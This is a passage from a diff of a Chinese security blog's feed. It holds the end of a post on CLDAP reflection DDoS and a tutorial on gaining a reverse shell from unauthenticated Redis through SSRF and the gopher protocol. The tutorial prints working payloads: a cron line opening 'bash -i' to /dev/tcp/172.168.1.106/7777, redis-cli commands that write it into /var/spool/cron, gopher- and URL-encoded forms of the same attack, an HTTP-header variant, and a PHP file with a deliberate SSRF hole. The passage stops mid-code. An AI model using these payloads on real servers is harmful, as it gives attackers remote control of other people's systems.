+&lt;p&gt;本文对CLDAP协议的缺陷以及其造成反射放大DDoS攻击的现状进行了介绍，同时对目前公开的攻击载荷Payload进行了改造，并进一步探索出了更精简的Payload，有效提升了攻击时的反射放大效率，最后借助ZoomEye对互联网中受影响的Windows服务器进行了统计与分析。当前的CLDAP DRDoS攻击主要是由于Windows服务器活动目录服务缺陷所引起，在防范上首先也应做到对389端口和636端口的限制，即确保端口不外漏或客户端IP白名单机制，也可以参考&lt;a href=&quot;https:&#x2F;&#x2F;people.apache.org&#x2F;~elecharny&#x2F;ldapcon&#x2F;Andrew%20Findlay-paper.pdf&quot;&gt;LDAP安全最佳实践&lt;&#x2F;a&gt;。&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;六、参考&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;blog.netlab.360.com&#x2F;memcache-ddos-ii-numbers-and-charts-by-ddosmon&#x2F;&quot;&gt;Memcache UDP反射放大攻击II：最近的数据分析&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;kb.iweb.com&#x2F;hc&#x2F;en-us&#x2F;articles&#x2F;115001073692-Guide-to-Microsoft-Active-Directory-rootDSE-C-LDAP-security-issues&quot;&gt;Guide to Microsoft Active Directory rootDSE&#x2F;C-LDAP security issues&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.us-cert.gov&#x2F;ncas&#x2F;alerts&#x2F;TA14-017A&quot;&gt;ALert(TA14-017A) UDP-Based Amplification Attacks&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;ldapwiki.com&#x2F;&quot;&gt;LDAP Wiki&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.akamai.com&#x2F;us&#x2F;en&#x2F;about&#x2F;our-thinking&#x2F;threat-advisories&#x2F;connection-less-lightweight-directory-access-protocol-reflection-ddos-threat-advisory.jsp&quot;&gt;CLDAP Reflection DDoS&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;windows-server&#x2F;identity&#x2F;ad-ds&#x2F;plan&#x2F;security-best-practices&#x2F;best-practices-for-securing-active-directory&quot;&gt;Best Practices for Security Active Directory&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;people.apache.org&#x2F;~elecharny&#x2F;ldapcon&#x2F;Andrew%20Findlay-paper.pdf&quot;&gt;Best Practices in LDAP Security&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;p&gt;*&lt;strong&gt;转载请注明作者及来源&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>Redis：为什么受伤的总是我？</title>
+        <published>2017-06-08T00:00:00+00:00</published>
+        <updated>2017-06-08T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              Unknown
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://0x0c.cc/posts/redis-wei-shen-me-shou-shang-de-zong-shi-wo/"/>
+        <id>https://0x0c.cc/posts/redis-wei-shen-me-shou-shang-de-zong-shi-wo/</id>
+        
+        <content type="html" xml:base="https://0x0c.cc/posts/redis-wei-shen-me-shou-shang-de-zong-shi-wo/">&lt;p&gt;&lt;strong&gt;前言&lt;&#x2F;strong&gt; ：ssrf开始火起来以后，内网的redis默默成为了背锅侠。未授权访问的问题导致其很容易被作为跳板而成为网络内部沦陷的罪魁祸首，于是每当发现一处ssrf漏洞的时候，大家总是试图去寻找内网中即将躺枪的redis。redis被弹shell弹出伤了，那到底有几种姿势弹shell？这次就用实验来说话。&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;基础知识和准备&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;一些IP：&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;Redis: 10.1.2.23
+&lt;&#x2F;span&gt;&lt;span&gt;WebServer: 10.1.2.22
+&lt;&#x2F;span&gt;&lt;span&gt;Attacker: 172.168.1.106
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;gopher，曾经非常有名的一种信息查找协议，它能将Internet上的文件组织成某种索引，不过现在已经淡出了历史。gopher协议的使用方法为：&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;gopher:&#x2F;&#x2F;ip:port&#x2F;_payload
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;使用gopher发出一次GET请求：&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;gopher:&#x2F;&#x2F;www.baidu.com:80&#x2F;_GET%20&#x2F;search&#x2F;error.html%20HTTP&#x2F;1.1%0d%0aHost:www.baidu.com
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;通常可以通过捕获其他协议数据流的方式将这些协议进行一定转换进而利用gopher协议通信。由于gopher协议具备这种跨协议通信的特点，也被赋予了万金油协议的别称。下面尝试将redis协议转换成为gopher协议，转换之前我们先来看看正常的redis反弹shell攻击载荷：&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; echo&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -e &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;\n\n*&#x2F;1 * * * * bash -i &amp;gt;&amp;amp; &#x2F;dev&#x2F;tcp&#x2F;172.168.1.106&#x2F;7777 0&amp;gt;&amp;amp;1\n\n&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;redis-cli&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -h&lt;&#x2F;span&gt;&lt;span&gt; 10.1.2.23&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -x&lt;&#x2F;span&gt;&lt;span&gt; set 1
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; redis-cli&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -h&lt;&#x2F;span&gt;&lt;span&gt; 10.1.2.23
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; 10.1.2.23:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;6379&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; 10.1.2.23:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;6379&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; config set dbfilename root
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; 10.1.2.23:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;6379&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; save
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;接下来使用socat监听本地的6379端口的数据流，再将数据流转发给redis服务器：&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;socat&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -v&lt;&#x2F;span&gt;&lt;span&gt; tcp-listen:6379,fork tcp-connect:10.1.2.23:6379
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;攻击本地的6379端口，得到这些数据流：&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2017&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;06&#x2F;08&lt;&#x2F;span&gt;&lt;span&gt; 14:37:05.164953  length=87 from=17 to=103
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;*3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;set&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt;6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;*&#x2F;1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* * * *&lt;&#x2F;span&gt;&lt;span&gt; bash&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;dev&#x2F;tcp&#x2F;172.168.1.106&#x2F;7777 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2017&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;06&#x2F;08&lt;&#x2F;span&gt;&lt;span&gt; 14:37:05.181301  length=5 from=9149 to=9153
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;+OK&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2017&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;06&#x2F;08&lt;&#x2F;span&gt;&lt;span&gt; 14:37:44.483567  length=57 from=17 to=73
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;*4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt;6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;config&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;set&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;dir&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;var&#x2F;spool&#x2F;cron&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2017&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;06&#x2F;08&lt;&#x2F;span&gt;&lt;span&gt; 14:37:44.501023  length=5 from=9149 to=9153
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;+OK&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2017&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;06&#x2F;08&lt;&#x2F;span&gt;&lt;span&gt; 14:37:49.822737  length=52 from=74 to=125
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;*4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt;6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;config&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;set&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;dbfilename&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;root&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2017&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;06&#x2F;08&lt;&#x2F;span&gt;&lt;span&gt; 14:37:49.837134  length=5 from=9154 to=9158
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;+OK&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2017&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;06&#x2F;08&lt;&#x2F;span&gt;&lt;span&gt; 14:37:53.276943  length=14 from=126 to=139
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;*1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;save&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2017&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;06&#x2F;08&lt;&#x2F;span&gt;&lt;span&gt; 14:37:53.313423  length=5 from=9159 to=9163
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;+OK&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;可以看出，上面的数据流中&quot;&amp;gt;&quot;表示进入redis服务器6379端口的数据，&quot;&amp;lt;&quot;表示redis服务器返回的消息。因此我们将&quot;&amp;gt;&quot;内的数据流使用下面的转换规则进行转换：&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;* #代表有几个参数
+&lt;&#x2F;span&gt;&lt;span&gt;$ #代表下面这个参数是几个字节
+&lt;&#x2F;span&gt;&lt;span&gt;\r#用%0d%0a表示
+&lt;&#x2F;span&gt;&lt;span&gt;#空白行用%0a表示
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;这样就得到了转换后的攻击载荷：&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;gopher:&#x2F;&#x2F;10.1.2.23:6379&#x2F;_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$60%0d%0a%0a%0a*&#x2F;1 * * * * bash -i &amp;gt;&amp;amp; &#x2F;dev&#x2F;tcp&#x2F;172.168.1.106&#x2F;7777 0&amp;gt;&amp;amp;1%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0adir%0d%0a$16%0d%0a&#x2F;var&#x2F;spool&#x2F;cron&#x2F;%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;将载荷进行一次url全编码：&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;gopher:&#x2F;&#x2F;10.1.2.23:6379&#x2F;_%2a%33%25%30%64%25%30%61%24%33%25%30%64%25%30%61%73%65%74%25%30%64%25%30%61%24%31%25%30%64%25%30%61%31%25%30%64%25%30%61%24%36%30%25%30%64%25%30%61%25%30%61%25%30%61%2a%2f%31%20%2a%20%2a%20%2a%20%2a%20%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%37%32%2e%31%36%38%2e%31%2e%31%30%36%2f%37%37%37%37%20%30%3e%26%31%25%30%61%25%30%61%25%30%64%25%30%61%2a%34%25%30%64%25%30%61%24%36%25%30%64%25%30%61%63%6f%6e%66%69%67%25%30%64%25%30%61%24%33%25%30%64%25%30%61%64%69%72%25%30%64%25%30%61%24%31%36%25%30%64%25%30%61%2f%76%61%72%2f%73%70%6f%6f%6c%2f%63%72%6f%6e%2f%25%30%64%25%30%61%2a%34%25%30%64%25%30%61%24%36%25%30%64%25%30%61%63%6f%6e%66%69%67%25%30%64%25%30%61%24%33%25%30%64%25%30%61%73%65%74%25%30%64%25%30%61%24%31%30%25%30%64%25%30%61%64%62%66%69%6c%65%6e%61%6d%65%25%30%64%25%30%61%24%34%25%30%64%25%30%61%72%6f%6f%74%25%30%64%25%30%61%2a%31%25%30%64%25%30%61%24%34%25%30%64%25%30%61%73%61%76%65%25%30%64%25%30%61
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;另外，如果向redis服务器发出一个http请求，会有这样的效果：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;07&#x2F;09&#x2F;5b435833abcb1.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;可以发现http请求头的每一行都被当做命令执行了，所以我们可以将攻击载荷放进一个http请求头部：&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;POST &#x2F; HTTP&#x2F;1.1
+&lt;&#x2F;span&gt;&lt;span&gt;HOST:10.1.2.23:6379
+&lt;&#x2F;span&gt;&lt;span&gt;set 1 &amp;quot;\n\n*&#x2F;1 * * * * bash -i &amp;gt;&amp;amp; &#x2F;dev&#x2F;tcp&#x2F;172.168.1.106&#x2F;7777 0&amp;gt;&amp;amp;1\n\n&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;
+&lt;&#x2F;span&gt;&lt;span&gt;config set dbfilename root save
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;发送这个请求，成功执行：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;07&#x2F;09&#x2F;5b43585b1208a.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;ssrf-gopher&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#ssrf-gopher&quot; aria-label=&quot;Anchor link for: ssrf-gopher&quot;&gt;ssrf + gopher:&#x2F;&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;条件：&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;存在ssrf的PHP web、Java web&lt;&#x2F;li&gt;
+&lt;li&gt;PHP中curl支持gopher或者curl&amp;gt;7.35.0、Java支持gopher&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;实验环境：&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Redis2.8.24(centOS7) #10.1.2.23&lt;&#x2F;li&gt;
+&lt;li&gt;PHP7.1 + Apache2.4.10 #10.1.2.22:8081&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;首先在Apache服务器的8081端口上创建一个含有ssrf漏洞的PHP文件index.php：&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;php&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-php &quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span&gt;&amp;lt;?php
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;curl&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;$ssrf&lt;&#x2F;span&gt;&lt;span&gt;){  
+&lt;&#x2F;span&gt;&lt;span&gt;        $ch &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;curl_init&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;curl_setopt&lt;&#x2F;span&gt;&lt;span&gt;($ch&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#ed9366;&quot;&gt;CURLOPT_URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;$ssrf)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;curl_setopt&lt;&#x2F;span&gt;&lt;span&gt;($ch&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#ed9366;&quot;&gt;CURLOPT_HEADER&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;curl_exec&lt;&#x2F;span&gt;&lt;span&gt;($ch)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;curl_close&lt;&#x2F;span&gt;&lt;span&gt;($ch)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;    }
